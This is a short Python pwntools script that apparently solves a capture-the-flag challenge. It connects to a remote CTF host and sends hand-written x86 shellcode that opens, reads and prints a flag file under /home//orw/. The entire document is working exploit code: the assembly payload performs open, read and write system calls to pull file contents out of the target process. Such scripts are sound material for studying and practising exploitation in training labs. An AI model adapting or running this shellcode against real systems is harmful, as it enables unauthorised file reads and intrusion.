from pwn import *

p = remote('csie.ctf.tw', 10124)

sh = """
    sub esp, 100
    xor ecx, ecx
    xor edx, edx
    xor eax, eax
    xor ebx, ebx
    push ecx
    push 0x67616c66
    push 0x2f2f7772
    push 0x6f2f2f65
    push 0x6d6f682f
    mov ebx, esp
    mov al, 5
    int 0x80
    nop
    mov ebx, eax
    mov ecx, esp
    mov edx, 60
    mov eax, 3
    int 0x80
    nop
    mov ebx, 1
    mov edx, 60
    mov eax, 4
    int 0x80
    nop
    add esp, 120
    ret
    """

p.send(asm(sh))
p.recvuntil('Give me your shellcode:')

print (p.recv(60))
